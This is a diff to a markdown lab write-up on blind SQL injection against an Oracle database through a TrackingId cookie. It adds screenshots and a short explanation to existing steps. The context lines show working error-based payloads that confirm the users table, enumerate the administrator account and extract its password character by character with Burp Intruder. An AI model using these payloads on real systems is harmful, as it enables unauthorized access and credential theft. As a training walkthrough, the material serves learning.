@@ -22,6 +22,8 @@
 * `TrackingId=xyz'||(SELECT '')||'` → **500 error** (Oracle requires FROM clause)
 * `TrackingId=xyz'||(SELECT '' FROM dual)||'` → **200 OK** (valid Oracle syntax)
 
+![check datatype column](images/13/payload_ck.png)
+
 ### Step 2 — Confirm injection is processed as SQL:
 
 * `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'` → **500 error**
@@ -36,15 +38,24 @@ TrackingId=xyz'||(SELECT
 '' FROM users WHERE ROWNUM=1)||'
 ```
 
+![check datatype column](images/13/usr_tbl_ck.png)
+
 → **200 OK** = table exists (no error)
 
 ### Step 4 — Confirm administrator user exists (CASE method):
+
+![check datatype column](images/13/usr_ck.png)
+
+First we checked username with default sql query and got 200 means username does not exist with this query. Then we check with another method called CASE method :
+
 
 ```plain id="7c4n9p"
 TrackingId=xyz'||(SELECT
 CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
 username='administrator')||'
 ```
+
+![check datatype column](images/13/usr_ck2.png)
 
 → **500 error** = user exists (row returned, `1/0` fires)
 
@@ -53,6 +64,8 @@ TrackingId=xyz'||(SELECT
 CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
 username='randomuser')||'
 ```
+
+![check datatype column](images/13/usr_ck1.png)
 
 → **200 OK** = user does not exist (no rows, subquery is NULL, no error)
 
@@ -64,6 +77,8 @@ CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
 username='administrator')||'
 ```
 
+![check datatype column](images/13/pass_ln_ck.png)
+
 → **500** (true, password > 1 char)
 
 ```plain id="1w7d5k"
@@ -72,9 +87,14 @@ CASE WHEN LENGTH(password)>25 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
 username='administrator')||'
 ```
 
+![check datatype column](images/13/pass_ln_ck1.png)
+
+
 → **200** (false, password ≤ 25)
 
 Used Burp Intruder to binary search → **password length = 20**
+
+![check datatype column](images/13/pass_ln_ck2.png)
 
 ### Step 6 — Extract password character-by-character:
 
@@ -85,6 +105,12 @@ TrackingId=xyz'||(SELECT
 CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users
 WHERE username='administrator')||'
 ```
+
+![check datatype column](images/13/pass_ck1.png)
+
+![check datatype column](images/13/pass_ck2.png)
+
+![check datatype column](images/13/pass_ck3.png)
 
 * **Position 1:** Character offset (1–20)
 * **Position 2:** Character value (a–z, 0–9)
